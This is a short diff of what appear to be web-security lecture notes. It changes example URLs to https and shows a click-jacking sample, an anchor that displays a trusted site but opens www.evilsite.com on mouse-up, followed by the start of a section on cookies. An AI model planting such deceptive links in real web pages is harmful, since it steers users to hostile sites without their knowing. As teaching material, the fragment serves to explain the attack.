-window window.open("http://brown.edu")
+window window.open("https://brown.edu")
 Click-jacking attack
-    <a onMouseUp="window.open(′http://
-    www.evilsite.com′)" href="http://
+    <a onMouseUp="window.open(′https://
+    www.evilsite.com′)" href="https://
     www.trustedsite.com/">Trust me!</a>
 Cookies
 Cookies are a small bit of information stored on client side computer associated with a specific server.
